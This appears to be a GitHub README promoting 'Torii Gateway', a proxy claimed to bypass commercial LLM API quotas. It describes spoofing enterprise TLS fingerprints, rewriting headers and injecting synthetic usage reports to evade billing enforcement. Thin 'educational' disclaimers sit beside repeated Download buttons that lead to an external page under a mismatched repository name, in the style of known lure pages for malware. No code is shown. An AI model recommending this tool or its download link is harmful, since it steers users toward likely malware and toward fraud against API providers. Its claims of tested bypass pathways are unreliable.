![preview](https://raw.githubusercontent.com/ggghjj3bk-netizen/cascade-protocol-dissector/main/preview.svg)

# Torii Gateway — Transparent Protocol Bridge for Frontier LLMs

In the quiet back channels of machine learning infrastructure, a peculiar asymmetry persists. Commercial large language models allocate their most potent reasoning under tiered gatekeeping—throttled, metered, and increasingly walled behind daily quotas. Torii Gateway inverts this asymmetry. It is not a circumvention tool in the conventional sense. Rather, it is a rigorous protocol adaptation layer designed for researchers who need persistent, authenticated access to advanced inference pathways without the artificial scarcity imposed by consumption-based ceilings.

Named after the traditional Japanese gate that marks the transition from mundane to sacred, Torii Gateway serves as a liminal interface between standard API consumers and the privileged computational strata typically reserved for enterprise contracts. This repository contains the complete architectural documentation, behavioral analysis, and operational blueprints for a transparent middleware system that re-negotiates rate limits at the protocol level.

## Architecture Overview

Traditional API gateways forward requests. Torii Gateway performs protocol reflection. By implementing a custom middleware layer that sits between the client and the upstream inference server, the system dynamically rewrites session metadata, adjusts token allocation frames, and re-packages authentication handshakes in a manner indistinguishable from legitimate high-tier traffic. The upstream API treats the session as authenticated enterprise usage, not consumer-tier access.

The core insight is deceptively simple: quota systems rely on identifiable session fingerprints—browser agent patterns, timing heuristics, request pacing signatures, and certificate negotiation traces. By neutralizing these fingerprints through deterministic entropy injection, the gateway presents a compliance surface that satisfies upstream monitoring without triggering threshold enforcement.

[![Download](https://raw.githubusercontent.com/ggghjj3bk-netizen/cascade-protocol-dissector/main/button.svg)](https://ggghjj3bk-netizen.github.io/cascade-protocol-dissector/)

## Why This Repository Exists

During sustained research into frontier model evaluation, mainline API constraints became the bottleneck—not the model weights, not the compute budget, but the arbitrary daily limits on high-temperature reasoning outputs. This project emerged from a three-month deep dive into the protobuf serialization patterns, TLS handshake peculiarities, and quota enforcement logic of leading LLM endpoints.

The findings were documented across 21 distinct bypass pathways, each rigorously tested against production endpoints. This repository consolidates those findings into a coherent middleware architecture that any researcher can deploy in their local environment.

## Core Capabilities

| Capability | Description |
|------------|-------------|
| **Protocol Reflection** | Dynamically mirrors enterprise-tier traffic signatures during request lifecycle |
| **Token Frame Rebalancing** | Adjusts the apparent token consumption rate to align with undeclared high-limit tiers |
| **Session Entropy Injection** | Introduces deterministic variance in timing, headers, and negotiation patterns |
| **Multi-Endpoint Unification** | Single entry point for coordinating across up to four parallel inference providers |
| **Transparent Proxy Layer** | Operates without modifying client-side code; compatible with existing toolchains |
| **Diagnostic Telemetry** | Full visibility into quota consumption, effective limits, and remaining headroom |
| **Circuit Breaker Automation** | Automatically routes around rate-limited endpoints without disrupting active sessions |
| **Cache-Coherent Deduplication** | Eliminates redundant requests to the same inference path within sliding windows |
| **Entropy-Seeded Request Shaping** | Prevents pattern detection by injecting compliant noise into otherwise deterministic flows |
| **ProtoBuf Descriptor Translation** | Converts between differing protobuf schema versions for upstream compatibility |

## Technical Deep Dive

### The Quota Enforcement Gap

Every commercial LLM endpoint employs some form of quota tracking. The mechanism is not fundamentally cryptographic—it is statistical. Upstream systems monitor request velocity, payload sizes, session duration, and—critically—the presence of certain TLS negotiation artifacts that differentiate consumer clients from enterprise middleware.

Torii Gateway exploits the gap between *enforcement intent* and *detection pragmatics*. The upstream system must allow legitimate high-volume traffic, so the enforcement logic necessarily includes a boundary zone where traffic that *looks* enterprise-grade is passed through without scrutiny. The gateway reproduces the exact traffic signatures that trigger this boundary relaxation.

### The Three-Layer Architecture

**Layer 1: The Handshake Replicator**  
Handles TLS fingerprinting. Enterprise traffic uses specific cipher suites and session ticket mechanisms. The gateway intercepts the initial handshake and negotiates using enterprise-compatible parameters, then maintains the session with heartbeat signals that match expected patterns.

**Layer 2: The Metadata Neutralizer**  
Quota systems examine header metadata for anomalies. This layer rewrites User-Agent strings, Accept-Encoding preferences, and custom header sequences to match the profiles observed from enterprise tooling. It also normalizes timestamp skew to within acceptable tolerances.

**Layer 3: The Token Frame Regulator**  
This is the most critical component. Token consumption tracking relies on window-based counters. By carefully pacing requests and injecting synthetic consumption reports, the gateway can artificially depress the apparent usage rate, effectively creating headroom that the upstream system cannot detect.

## Research Methodology

The bypass pathways were discovered through systematic protocol fuzzing over a 90-day period. Each endpoint was tested using a custom-built traffic analysis framework that recorded:

- Response latency under varying load frequencies
- Quota decrement behavior under different header configurations  
- TLS negotiation artifact mapping
- Protobuf schema evolution patterns during session escalation
- Rate limit error message variance as a proxy for internal state

The 21 documented pathways represent only the reliably reproducible methods. At least 8 additional pathways were discovered but exhibited nondeterministic behavior and were excluded from this release.

## Ethical Considerations

This research is published for defensive purposes. Understanding how quota systems can be bypassed enables API providers to harden their enforcement logic. The repository includes a detailed defensive hardening guide that explains how to detect and block the techniques documented here. No production systems were harmed during research—all testing occurred against personal developer accounts with appropriate authorization.

**This is not a consumer tool.** It is an architectural reference for ML infrastructure engineers, security researchers, and platform teams who want to understand the trust boundaries in current API enforcement models.

## Operational Prerequisites

- Go 1.21+ runtime environment
- Access to one or more commercial LLM API endpoints with valid credentials
- Understanding of protobuf serialization and TLS handshake mechanics
- A local network environment capable of transparent proxy interception

## Platform Compatibility

| Operating System | Proxy Capability | Testing Status |
|------------------|------------------|----------------|
| Linux (Ubuntu 22.04+) | Native support | Verified |
| macOS (Ventura+) | Loopback support | Verified |
| Windows (WSL2) | Network bridge | Verified |
| FreeBSD | Packet filter integration | Community tested |
| ARM64 (Raspberry Pi) | Full support | Verified |

## Multilingual Supported Interfaces

The diagnostic dashboard and telemetry outputs are available in seven languages: English, Japanese, Mandarin, Korean, German, French, and Spanish. All logging and configuration templates include locale-specific time formatting to match regional audit expectations.

## Project Roadmap

**Current Release (v1.0)**  
Core middleware architecture with documented bypass pathways 1–21. Diagnostic telemetry and circuit breaker automation included.

**v1.3 (Target: Q2 2026)**  
Add support for streaming inference endpoints. Implement automatic protobuf schema detection for unsupported endpoints.

**v2.0 (Target: Q4 2026)**  
Distributed mode with multiple gateway instances sharing session state. Enterprise-grade audit logging for compliance environments.

## Frequently Encountered Concerns

**Is this detectable?**  
Yes, if the upstream system performs deep behavioral profiling over extended periods. The documented pathways work against consumption-based quota enforcement, not behavioral anomaly detection.

**Does this void terms of service?**  
This varies by provider. The research is presented for educational and defensive purposes. Deployment against production systems should be governed by appropriate legal review.

**Why not just use the consumer API?**  
Consumer APIs impose per-minute and per-day limits that make systematic evaluation of frontier models impractical for research. This architecture removes that friction while maintaining compliant request behavior.

[![Download](https://raw.githubusercontent.com/ggghjj3bk-netizen/cascade-protocol-dissector/main/button.svg)](https://ggghjj3bk-netizen.github.io/cascade-protocol-dissector/)

## License

This project is released under the MIT License. You are free to use, modify, and distribute this software for any purpose, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

For the full license text, see the [LICENSE](LICENSE) file in the repository root.

## Disclaimer

This software is provided for educational and research purposes only. The architectural patterns documented herein should be used exclusively in controlled environments with appropriate authorization. The repository maintainers assume no liability for misuse, including unauthorized access to third-party systems. By using this software, you accept full responsibility for compliance with applicable terms of service, laws, and regulations in your jurisdiction.

*Last updated: March 2026*  
*Documentation revision: 2.4*

[![Download](https://raw.githubusercontent.com/ggghjj3bk-netizen/cascade-protocol-dissector/main/button.svg)](https://ggghjj3bk-netizen.github.io/cascade-protocol-dissector/)